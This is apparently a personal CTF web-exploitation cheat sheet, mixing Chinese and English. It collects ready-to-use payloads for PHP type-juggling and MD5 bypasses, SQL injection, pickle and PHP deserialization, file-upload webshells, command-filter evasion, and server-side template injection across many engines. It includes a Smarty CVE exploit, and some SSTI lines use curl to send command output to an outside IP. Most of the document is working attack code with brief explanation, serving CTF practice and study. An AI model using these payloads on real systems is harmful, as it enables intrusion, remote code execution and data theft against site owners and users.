# CTF Note => Web

[toc]

## 代码泄露

```sh
index.php.swp
.git
index.php.bak
www.tar.gz
robots.txt
www.zip
```

## HTTP Header

### 来源

It doesn't come from 'https://Sycsecret.buuoj.cn'

```http
Referer: https://www.ctf.cn
```

### 浏览器

Please use "Syclover" browser

```http
User-Agent: Syclover
```

### Source IP

```http
X-Forwarded-For: 127.0.0.1
Client-ip: 127.0.0.1
```

## PHP Args

### $_SERVER

#### $_SERVER['QUERY_STRING']

```php
// 判断传参的字符串，不能有_和%5f
if( substr_count($_SERVER['QUERY_STRING'], '_') !== 0 || substr_count($_SERVER['QUERY_STRING'], '%5f') != 0 )
	// PHP会将传参中的空格( )、小数点(.)自动替换成下划线 => a.b.c = a_b_c
  
// 判断get传参b_u_p_t不等于23333 并且开头和结尾和中间必须是23333
if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t']))
  // 加个换行符url编码为%0a 即可绕过 => 23333%0a
```

#### $_SERVER['PHP_SELF']

```php
$_SERVER['PHP_SELF']
// 返回的是当前正在执行的脚本的名字
// 如果是/index.php/config.php/，则$_SERVER['PHP_SELF']返回/index.php/config.php/
basename($_SERVER['PHP_SELF']) => basename('/index.php/config.php/') => config.php
```

### $_GET File

```php
file_get_contents($_GET['file'])
// 得到原始的post数据
php://input
post => todat is a happy day

// 得到原始的post数据
data:text/plain,todat is a happy day
```

## PHP Func

### ascii码转换

`chr()`: ascii码转换，ascii => Str

`ord()`: ascii码转换，Str => ascii

```php
echo chr(97);
// a
echo ord('a');
// 97
```

### basename

```php
basename('/index.php/config.php/') => config.php
// basename()会去掉不可见字符，使用超过ascii码范围的字符就可以绕过
// preg_match('/config\.php\/*$/i', basename($_SERVER['PHP_SELF']))
```

### String操作

```php
echo mb_substr("菜鸟教程", 0, 2); 
// 输出：菜鸟
echo mb_strpos($page . '?', '?')
// 查找字符串在另一个字符串中首次出现的位置
stristr($file,"input")
// 返回匹配的子字符串。如果未找到，返回 false。
```

### File操作

```php
// 读取目录
// '/'被过滤，使用chr(47)绕过
var_dump(scandir(chr(47)))

// file_get_contents()读取文件
?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))
```

### 数据类型

#### ==

弱比较：如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行，在比较时该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。

```php
$key = "123";
$str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
if($key == $str) {
    echo True;
}
```

#### 字符问题

买flag需要money>1337，但只能是单字符参数

在https://www.compart.com/en/unicode/找大于1337的unicode字符（搜索`Thousand`）, 用utf-8转url编码

```php
0xE1 0x8D 0xBC ==> %E1%8D%BC
```

#### 整形问题

数据过长，可以改成科学计数法。 100000000 => 10e8

##### intval()

intval()括号内是一个string的数字和字符串混合内容时，则返回的是这串内容的第一位数字，而当我们对这个字符型的内容进行加减乘除操作的时候，这串字符则会对应地转换为int或者double类型

```php
intVal("1e10") ==> 1
intVal("1e10+1") ==> 14100000..
```

### MD5

#### sql语句中

```
select * from 'admin' where password=md5($pass,true)
```

Sql注入，用`ffifdyop`绕过

原理：

`ffifdyop` 这个字符串被 md5 哈希了之后会变成 `276f722736c95d99e921722cf9ed621c`，这个字符串前几位刚好是`' or '6`

而 Mysql 刚好又会把 hex 转成 ascii 解释，因此拼接之后的形式是`select * from 'admin' where password='' or '6xxxxx'`，等价于 or 一个永真式

#### md5碰撞

```php
$a = $_GET['a'];
$b = $_GET['b'];
```

##### 弱比较

```php
if($a != $b && md5($a) == md5($b)){
```

可以用md5值为0e开头的来撞。

```sh
QNKCDZO
0e830400451993494058024219903391

s878926199a
0e545993274517709034328855841020

s155964671a
0e342768416822451524974117254469

s214587387a
0e848240448830537924465865611904

s214587387a
0e848240448830537924465865611904

s878926199a
0e545993274517709034328855841020

s1091221200a
0e940624217856561557816327384675

s1885207154a
0e509367213418206700842008763514
```

另一种

```php
if ($md5==md5($md5))
//如果有一串内容以0e开头，那么这串内容会以科学计数法的形式表示，而0的次方就是0。
// 所以，我们的思路就是通过找到一个0e开头的值，且md5加密后的内容也是0e开头的，使得条件为真。
// 满足条件的值：0e215962017
```



##### 强比较

```php
if($_POST['a']!==$_POST['b']&&md5($_POST['a'])===md5($_POST['b'])){
```

md5强比较，此时如果传入的两个参数不是字符串，而是数组，md5()函数无法解出其数值，而且不会报错，就会得到===强比较的值相等

```http
a[]=1&b[]=2
```

&符号绕过

```http
a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&
b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2&
```

### 数学函数RCE

可用函数

```php
base_convert()	在任意进制之间转换数字。
bindec()				把二进制转换为十进制。
decbin()				把十进制转换为二进制。
dechex()        把十进制转换为十六进制。
decoct() 				把十进制转换为八进制。
hexdec()				把十六进制转换为十进制。
octdec()				把八进制转换为十进制。
```

因为`[]`被过滤所以使用`{}`

执行`system(cat /flag)` - 转变为 `{a}({b})&a=system&b=cat /flag`

这时候我们需要构造一个_GET参数

```php
php -r 'echo base_convert("hex2bin",36,10);'
37907361743

//得到了hex2bin函数
base_convert(37907361743,10,36)
```

有了hex2bin只有就简单了我们可以用现成的函数转

`base_convert(37907361743,10,36)(dechex(1598506324))`这就是_GET

```php
$pi=base_convert(37907361743,10,36)(dechex(1598506324));
($$pi){pi}(($$pi){pow})&pi=system&pow=cat /flag
// $$pi => $_GET
// ($$pi){pi} => $_GET[pi]
// (($$pi){pow}) => $_GET[pow]

?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){pow})&pi=system&pow=cat /flag
// system('cat /flag')
```

## JWT

1. [JWT Decode](https://jwt.io/)
2. 使用[c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker)爆破密钥
3. 伪造admin的JWT

## File Upload

### Content-Type

Content-Type: image/jpeg

### 文件头

GIF文件头 GIF89a

文件内容

### 后缀限制

#### .htaccess

将png后缀解析为php

```htaccess
<FilesMatch "png">
SetHandler application/x-httpd-php
</FilesMatch>
```

#### .user.ini

传一个.user.ini 文件，当我们对目录中的任何php文件进行访问时，都会调用.user.ini中指的文件以php的形式进行读取

```ini
auto_prepend_file=1.png
```

#### php

```php
<?= @eval($_POST["pwd"]);?>
```

#### phtml

```php
<script language="php">eval($_REQUEST[123])</script>
```

#### Shtml

```php
<!--#exec cmd="ls"-->
```

### File Content

过滤了`<?`/`<?php`

```php
<script language="php">eval($_REQUEST[123])</script>
```

## File Include/Read

### tomcat

WEB-INF主要包含一下文件或目录：    

- /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。    
- /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中   
- /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件    
- /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。    
- /WEB-INF/database.properties：数据库配置文件

## UnSerialize

### python

```python
import pickle
import urllib

class payload(object):
    def __reduce__(self):  ##当pickle对象被调用时自动执行
       return (eval, ("open('/flag.txt','r').read()",)) ##注意要是元组

a = pickle.dumps(payload())
a = urllib.quote(a)
print a
```

### PHP

#### 序列化特性

> __construct()//当一个对象创建时被调用
>
> __destruct() //当一个对象销毁时被调用
>
> __toString() //当此类的对象被当作一个字符串使用
>
> __sleep()//在对象在被序列化之前运行
>
> __wakeup()//将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)
>
> __get()//获得一个类的成员变量时调用
>
> __set()//设置一个类的成员变量时调用
>
> __invoke()//此类的对象作为函数被调用时调用
>
> __call()//当调用一个对象中的不能用的方法的时候就会执行这个函数

反序列化时会先执行`__wakeup()`魔术方法，然后执行`__destruct() `。

在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过 `__wakeup()`函数的执行

原始：

```php
O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;}
```

跳过 `__wakeup()`函数

```php
O:4:"Name":3:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;}
```

私有字段的字段名在序列化时，类名和字段名前面都会加上0的前缀。字符串长度也包括所加前缀的长度

```php
O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
```

#### 序列化代码

```
<?php

class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }
}
$a = new Name('admin', 100);
var_dump(serialize($a));

?>
```

#### 反序列化字符逃逸

```php
<?php
$str='a:2:{i:0;s:8:"Hed9eh0g";i:1;s:5:"aaaaa";}';
var_dump(unserialize($str));

$str='a:2:{i:0;s:8:"Hed9eh0g";i:1;s:5:"aaaaa";}abc';
var_dump(unserialize($str));
?>
```

结果一致

wp

```php
$_SESSION["user"]='flagflagflagflagflagflag'；
$_SESSION["function"]='a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}';
$_SESSION["img"]='L2QwZzNfZmxsbGxsbGFn';
echo serialize($_SESSION);
```

## Sql Inject

### stack

堆叠注入，`HANDLER ... OPEN`语句打开一个表，使其可以使用后续`HANDLER ... READ`语句访问，该表对象未被其他会话共享，并且在会话调用`HANDLER ... CLOSE`或会话终止之前不会关闭

```mysql
1';
HANDLER FlagHere OPEN;
HANDLER FlagHere READ FIRST;
HANDLER FlagHere CLOSE;#
```

### Boolean

```sql
if(length(database())>1,1,0)

# 查询库名
1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),1,1))>97)^1

# 查询表名
1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='ctf'),1,1))>97)^1

# 查询列名
1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),1,1))>97)^1

# 查询flag
1^(ord(substr((select(group_concat(value))from(flag)),1,1))>97)^1
```

### ReadFile

Sql注入root权限直接用`load_file` 读flag

### Bypass

#### 修改已知表的列

```sql
# 添加一个列
alter table " table_name" add " column_name"  type;

# 删除一个列
alter table " table_name" drop " column_name"  type;

# 改变列的数据类型
alter table " table_name" alter column " column_name" type;

# 改列名
alter table " table_name" change " column1" " column2" type;
alter table "table_name" rename "column1" to "column2";
```

#### 无列名注入

因为没有mysql.innodb_column_stats这个方法，查不了列

判断有多少列，有多少个1就有多少列。

```sql
select group_concat(1) from users
```

利用数字3代替未知的列名，需要加上反引号。后面加了一个a是为了表示这个表（select 1,2,3 union select * from user）的别名，不然会报错。

```sql
select `3` from (select 1,2,3 union select * from user)a;
```

当 ` 不能使用时，用别名来代替：

```sql
select b from (select 1,2,3 as b union select * from user)a;
```

#### Hex 执行sql

```sql
SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;
# prepare…from…是预处理语句，会进行编码转换。
prepare execsql from @a;
# execute用来执行由SQLPrepare创建的SQL语句。
execute execsql;
```

#### || => 拼接

```sql
# 将||的作用由or变为拼接字符串
set sql_mode=pipes_as_concat;
```

#### 过滤关键字

##### Select/Where

```sql
# 过滤 select 和 where
show datebases; #数据库。
show tables; #表名。
show columns from table; #字段。
```

##### order

```sql
order by => group by
```

##### 空格

```sql
show database; => show/**/database;

# 任何可以计算出结果的语句，都可以用括号包围起来。
select user() from dual; => select(user())from dual;

# %a0特性，在进行正则匹配时，识别为中文字符，所以不会被过滤掉，在进入SQL语句后，Mysql是不认中文字符的，所以直接当作空格处理
select * from test; => select%a0*from%a0test;
```

##### 默认库/表

```sql
information_schema.tables => mysql.innodb_table_stats
table_schema => database_name
```

## RCE

利用PHP的字符串解析特性就能够进行绕过waf 构造参数? num=phpinfo()（注意num前面有个空格）就能够绕过

### Linux env

```sh
# Linux命令的位置：
/bin,/usr/bin # 默认都是全体用户使用，
/sbin,/usr/sbin # 默认root用户使用
```

### **escapeshellcmd()** 和 **escapeshellarg()** 

1. 传入的参数是

   ```php
   127.0.0.1' -v -d a=1
   ```

2. 由于`escapeshellarg`先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。所以处理之后的效果如下：

   ```php
   '127.0.0.1'\'' -v -d a=1'
   ```

3. 经过`escapeshellcmd`针对第二步处理之后的参数中的`\`以及`a=1'`中的单引号进行处理转义之后的效果如下所示：

   ```php
   '127.0.0.1'\\'' -v -d a=1\'
   ```

4. 由于第三步处理之后的payload中的`\\`被解释成了`\`而不再是转义字符，所以单引号配对连接之后将payload分割为三个部分，

所以这个payload可以简化为`curl 127.0.0.1\ -v -d a=1'`，即向`127.0.0.1\`发起请求，POST 数据为`a=1'`。

但是如果是先用 **escapeshellcmd** 函数过滤,再用的 **escapeshellarg** 函数过滤,则没有这个问题。

### 正则绕过

#### [A-Za-z0-9]

```php
preg_match("/[A-Za-z0-9]+/",$code)
//不能包含a到z的大小写字符和1到10的数字, 可用取反绕过
  
// phpinfo
echo urlencode(~'phpinfo');
// %8F%97%8F%96%91%99%90 => /?code=(~%8F%97%8F%96%91%99%90)();

// 写马, 蚁剑连接
echo urlencode(~'assert');
// %9E%8C%8C%9A%8D%8B
echo urlencode(~'(eval($_POST[cmd]))');
// %D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6%D6
// /?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6%D6)
```

#### Json参数

```php
if (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json))
// preg_match只会去匹配第一行, json_decode会忽略

{"cmd":"ls"} => {%0a"cmd":%0a"ls"}
```

#### 空格

```php
# 空格绕过 $IFS
cat$IFSflag.php
ca""t%09flag
ca\t%09flag
ca""t$IFS$9flag
ca""t$IFS$1flag
ca""t${IFS}$1flag
tail$IFS$1flag
tac$IFS$1flag
```

#### flag

```php
# 使用`ls`输出flag所在目录，然后全部cat
cat$IFS`ls`

# 设置环境变量绕过
a=g;cat$IFSfla$a.php

# base64编码绕过
echo$IFSY2F0IGZsYWcucGhw|base64$IFS-d|sh
```

#### 无参RCE

只能使用没有参数的php函数

```php
if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
```

查看当前目录

```php
print_r(scandir(current(localeconv())));
```

反转数组函数:array_reverse()。再让指针指向下一个数组元素（第二个）next()

```php
print_r(next(array_reverse(scandir(current(localeconv())))));
```

使用高亮函数, `highlight_file()` , 当使用该函数时，整个文件都将被显示，包括密码和其他敏感信息

```php
highlight_file(next(array_reverse(scandir(current(localeconv())))));
```

## SSRF

伪协议

```php
// base64输出f1ag.php
php://filter/read=convert.base64-encode/resource=f1ag.php

// 得到原始的post数据
php://input
post => todat is a happy day

// 得到原始的post数据
data:text/plain,todat is a happy day
```

## SSTI

| Engine               | Language   | port | tags               |
| -------------------- | ---------- | ---- | ------------------ |
| jinja2               | Python     | 5000 | {{%s}}             |
| Mako                 | Python     | 5001 | ${%s}              |
| Tornado              | Python     | 5002 | {{%s}}             |
| Django               | Python     | 5003 | {{ }}              |
| (code eval)          | Python     | 5004 | na                 |
| (code exec)          | Python     | 5005 | na                 |
| Smarty               | PHP        | 5020 | {%s}               |
| Smarty (secure mode) | PHP        | 5021 | {%s}               |
| Twig                 | PHP        | 5022 | {{%s}}             |
| (code eval)          | PHP        | 5023 | na                 |
| FreeMarker           | Java       | 5051 | <#%s > ${%s}       |
| Velocity             | Java       | 5052 | #set($x=1+1)${x}   |
| Thymeleaf            | Java       | 5053 |                    |
| Groovy*              | Java       | ×    | ×                  |
| jade                 | Java       | ×    | ×                  |
| Nunjucks             | JavaScript | 5062 | {{%s}}             |
| doT                  | JavaScript | 5063 | {{=%s}}            |
| Marko                | JavaScript | ×    | ×                  |
| Dust                 | JavaScript | 5065 | {#%s}or{%s}or{@%s} |
| EJS                  | JavaScript | 5066 | <%= %>             |
| (code eval)          | JavaScript | 5067 | na                 |
| vuejs                | JavaScript | 5068 | {{%s}}             |
| jade                 | Nodejs     | 5069 | #{%s}              |
| Slim                 | Ruby       | 5080 | #{%s}              |
| ERB                  | Ruby       | 5081 | <%=%s%>            |
| (code eval)          | Ruby       | 5082 | na                 |
| go                   | go         | 5090 | na                 |

### Ruby

#### eval

```ruby
2*3
system("ls")
```

#### erb

```ruby
<%=2*3%>
<%=%x(ls )%>
<%=system( "touch attackerFile" )%>
```

#### slim

```ruby
#{2*3}
#{%x( ls )}
#{system( "touch attackerFile" )}
```

### Python

[Python SSTI => BYPASS](https://mp.weixin.qq.com/s/43nIimUITehBI2h21e9IgA)

#### eval/exec

```python
# eval
2*3
__import__("subprocess").check_output("ls")

# exec 无回显
__import__("os").system("cat *")
__import__("subprocess").Popen("echo Hello World", shell=True, stdout=subprocess.PIPE).stdout.read()
__import__("subprocess").check_output("ls")
```

#### jinja2/Flask

```
__class__ 返回调用的参数类型
__bases__ 返回类型列表
__mro__ 此属性是在方法解析期间寻找基类时考虑的类元组
__subclasses__() 返回object的子类
__globals__ 函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价
```

##### 注入思路

随便找一个内置类对象用`__class__`拿到他所对应的类，用`__bases__`拿到基类（<class ‘object’>），用`__subclasses__()`拿到子类列表，在子类列表中直接寻找可以利用的类getshell

接下来只要找到能够利用的类（方法、函数）就好了：

可以使用如下脚本帮助查找方法：

```python
from flask import Flask,request
from jinja2 import Template
search = 'eval'   
num = -1
for i in ().__class__.__bases__[0].__subclasses__():
    num += 1
    try:
        if search in i.__init__.__globals__.keys():
            print(i, num)
    except:
        pass
```

##### POC

```python
{{2*3}}
{{7+8}}
{{7*7}} #测试是否存在漏洞
{{config}} #查看所有app.config内容
{{url_for.__globals__}} #以字典类型返回当前位置的全部全局变量
{{url_for.__globals__['current_app'].config}}

# 爆出所有的类
{{''.__class__.__mro__[2].__subclasses__()}}

# 查询subprocess.Popen
    import requests
    import re
    import html

    url = "http://f2c96b25-5710-4057-b5e2-12e39acf4921.node3.buuoj.cn/?search=		{{%27%27.__class__.__mro__[2].__subclasses__()}}"
    s = requests.get(url).text
    result = re.findall("\<h2\>You searched for:\<\/h2\>\\n  \<h3\>\[(.*?)\<\/h3\>",s,re.S)
    #反转义字符串
    result = html.unescape(result[0])[:-1]
    result = result.split(', ')
    print(result.index("<class 'subprocess.Popen'>"))
    
# 使用索引替换258
{{''.__class__.__mro__[2].__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()[0].strip()}}

# 读取文件
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read()}}{% endif %}{% endfor %}

# 列目录
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__im'+'port__']('o'+'s').listdir('/')}}{% endif %}{% endfor %}

# python3 读取文件
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__=='file' %}
{{"find!"}}
{{ c("/etc/passwd").readlines() }}
{% endif %}
{% endfor %}

# python2/3 rce
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='_IterationGuard' %}{{ c.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()") }}{% endif %}{% endfor %}

{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{% for b in c.__init__.__globals__.values() %}{% if b.__class__ == {}.__class__ %}{% if 'eval' in b.keys() %}{{ b['eval']('__import__("os").popen("id").read()') }}{% endif %}{% endif %}{% endfor %}{% endif %}{% endfor %}
```

##### Bypass

绕过中括号

```python
#通过__bases__.__getitem__(0)（__subclasses__().__getitem__(128)）绕过__bases__[0]（__subclasses__()[128]）
#通过__subclasses__().pop(128)绕过__bases__[0]（__subclasses__()[128]）
"".__class__.__bases__.__getitem__(0).__subclasses__().pop(128).__init__.__globals__.popen('whoami').read()
```

过滤{{或者}}

```python
{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://39.105.116.195:8080/?i=`whoami`').read()=='p' %}1{% endif %}
```

过滤_

用编码绕过

```python
比如：__class__ => \x5f\x5fclass\x5f\x5f

_是\x5f，.是\x2E
过滤了_可以用dir(0)[0][0]或者request['args']或者 request['values']绕过
但是如果还过滤了 args所以我们用request[‘values’]和attr结合绕过
例如''.__class__写成 ''|attr(request['values']['x1']),然后post传入x1=__class__
```

绕过逗号+中括号

```python
{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(250).__init__.__globals__.__builtins__.chr %}{{().__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.os.popen(chr(119)%2bchr(104)%2bchr(111)%2bchr(97)%2bchr(109)%2bchr(105)).read()}}
```

过滤.
.在payload中是很重要的，但是我们依旧可以采用attr()或[]绕过

```python
正常payload：
url?name={{().__class__.__base__.__subclasses__[177].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ipconfig").read()')}}`

使用attr()绕过：

{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(177)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("dir").read()')}}

使用[]绕过：
可以用getitem()用来获取序号

url?name={{ config['__class__']['__init__']['__globals__']['os']['popen']('ipconfig')['read']() }}

其他：
''.__class__可以写成 getattr('',"__class__")或者 ’'|attr("__class__")
```

过滤[]
可以用getitem()用来获取序号

```python
"".__class__.__mro__[2]
"".__class__.__mro__.__getitem__(2)
```

绕过双大括号（dns外带）

```python
{% if ''.__class__.__bases__.__getitem__(0).__subclasses__().pop(250).__init__.__globals__.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %}1{% endif %}
```

绕过 引号 中括号 通用getshell

```python
{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(250).__init__.__globals__.__builtins__.chr %}{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__==chr(95)%2bchr(119)%2bchr(114)%2bchr(97)%2bchr(112)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(111)%2bchr(115)%2bchr(101) %}{{ c.__init__.__globals__.popen(chr(119)%2bchr(104)%2bchr(111)%2bchr(97)%2bchr(109)%2bchr(105)).read() }}{% endif %}{% endfor %}
```

#### tornado

使用`?msg={handler.settings}` 获取cookie_secret

```python
{{2*3}}
{{__import__("subprocess").check_output("ls")}}
```

#### Mako

```python
${2*3}
${__import__("subprocess").check_output("ls")}
${__import__(chr(115)+chr(117)+chr(98)+chr(112)+chr(114)+chr(111)+chr(99)+chr(101)+chr(115)+chr(115)).check_output(chr(108)+chr(115))}
```

### JavaScript

#### VueJs

```javascript
{{2*3}}
{{constructor.constructor("return global.process.mainModule.require('child_process').execSync('ls').toString()")()}}
```

#### Nunjucks

```javascript
{{2*3}}
{{range.constructor("return eval(\"global.process.mainModule.require('child_process').execSync('ls').toString()\")")()}}
```

#### ejs

```javascript
<%=2*3 %>
<%=global.process.mainModule.require('child_process').execSync('ls').toString() %>
```

#### Dust

```javascript
{#1+1}
{name}{len}
{1+1}
{@1+1}
```

#### Jade

```javascript
#{2*3}
#{global.process.mainModule.require('child_process').execSync('ls').toString())}
```

#### Dot

```javascript
{{=2*3}}
{{= global.process.mainModule.require('child_process').execSync('ls').toString() }}
```



### Java

#### Freemarker

FreeMarker 是一款 模板引擎： 即一种基于模板和要改变的数据， 并用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。

##### 框架探测

1. 使用`${7*7}`或`#{7*7}`,如果返回49，则基本可以确认存在模板注入漏洞。
2. 使用特殊字符等方式去尝试报错：
   1. `${{<％[％’”}}％\`
   2. 如果引发了报错，则可能存在问题，同时还可能爆出模板引擎是什么，有时甚至是哪个版本。

##### POC

```java
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id)}
```

#### Thymeleaf

`[[${9*9}]]`

控制层用的是@Controller 进行注解的话，使用如下的payload 即可触发命令执行。

```java
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
// URL编码
__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22whoami%22).getInputStream()).next()%7d__::.x

// 回显
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::

__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("touch executed").getInputStream()).next()}__::
```

##### POC

```java
[[${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("sleep 5").waitFor()}]]
```

#### Velocity

Velocity是一个基于Java的模板引擎，它提供了一个模板语言去引用由Java代码定义的对象。它允许web 页面设计者引用JAVA代码预定义的方法

##### POC

`Payload => #set($var=2*3)$var`

##### 回显

```java
// 无回显
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("open -a Calculator")

#set($x='')##
#set($rt = $x.class.forName('java.lang.Runtime'))##
#set($chr = $x.class.forName('java.lang.Character'))##
#set($str = $x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('id'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
#foreach( $i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end

#set ($e="exp")
#set ($a=$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec($cmd))
#set ($input=$e.getClass().forName("java.lang.Process").getMethod("getInputStream").invoke($a))
#set($sc = $e.getClass().forName("java.util.Scanner"))
#set($constructor = $sc.getDeclaredConstructor($e.getClass().forName("java.io.InputStream")))
#set($scan=$constructor.newInstance($input).useDelimiter("\A"))
#if($scan.hasNext())
$scan.next()
#end
```

### Go

- 利用`{{ . }}` 这种形式来返回全部的模板中的内容
- 还可以进行`{{printf "%s"}}`格式的输出
- 还有一些其他可以用于输出的payload： `{{html "ssti"}}`, `{{js "ssti"}}` 实现的也是如上效果，实际上直接`{{"ssti"}}`也可以.

通过模板语法可知可以像`{{ .Name }}`一样调用对象方法，模板内部并不存在可以RCE的函数，所以除非有人为渲染对象定义了RCE或文件读取的方法，不然这个问题是不存在的。

```go
func (u *User) System(cmd string, arg ...string) string {
	out, _ := exec.Command(cmd, arg...).CombinedOutput()
	return string(out)
}

func (u *User) FileRead(File string) string {
	data, err := ioutil.ReadFile(File)
	if err != nil {
		fmt.Print("File read error")
	}
	return string(data)
}
```

如果定义了就可以通过`{{.System "whoami"}}`和`{{.FileRead "filepath"}}`执行

### PHP

#### Smart

Smarty 模板是基于 PHP 开发的模板，我们可以利用 Smarty 实现程序逻辑与页面显示（HTML/CSS）代码分离的功能。模板引擎中花哨的功能导致了模板注入的出现，也就是SSTI。

[官方文档](https://www.smarty.net/about_smarty)

##### POC

`Paylaod => {2*2}`

##### 搜集信息

```php
//返回版本信息
{$smarty.version}
//返回当前模板的文件名
${smarty.template}
```

##### 获取类的静态方法

通过 self 标签来获取 Smarty 类的静态方法，比如 getStreamVariable 读文件

> 这种利用方式只存在于旧版本中，而且在 **3.1.30** 的 Smarty 版本中官方已经将 getStreamVariable 静态方法删除。

```php
{self::getStreamVariable("file:///etc/passwd")}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

##### literal标签

`{literal}` 标签可以让一个模板区域的字符原样输出。在 PHP5 环境下存在一种 PHP 标签，` <script language="php"></script>`，我们便可以利用这一标签进行任意的 PHP 代码执行。

```php
{literal}alert('xss');{/literal}
<script language="php">phpinfo();</script>   
```

##### IF标签

Smarty 的 `{if}` 条件判断和 PHP 的 if 非常相似，只是增加了一些特性。每个 `{if}` 必须有一个配对的` {/if}`，也可以使用 `{else} `和 `{elseif} `，全部的PHP条件表达式和函数都可以在 `{if}` 标签中使用。

```php
{if phpinfo()}{/if}
{if readfile ('/flag')}{/if}
{if show_source('/flag')}{/if}
{if system('cat /flag')}{/if}
```

##### PHP标签

Smarty3 官方手册中明确表示已经废弃 {php} 标签，不建议使用。在 Smarty3.1， {php} 仅在 SmartyBC 中可用。

```php
{php}echo id;{/php}
```

##### include标签

- 被[{include}](https://www.smarty.net/docs/en/language.function.include.tpl) 标签引入的文件只会单纯的输出文件内容，就算引入 php 文件也是如此。
- 无版本限制

```php
string:{include file='/etc/passwd'}
string:{include file='index.php'}
```

##### CVE-2021-26120

- [{function}](https://www.smarty.net/docs/en/language.function.function.tpl) 标签的 name 属性可以通过精心构造注入恶意代码。
- 在 3.1.39 版本修复，所以只有小于 3.1.39 能用。

```php
string:{function name='x(){};system(whoami);function '}{/function}
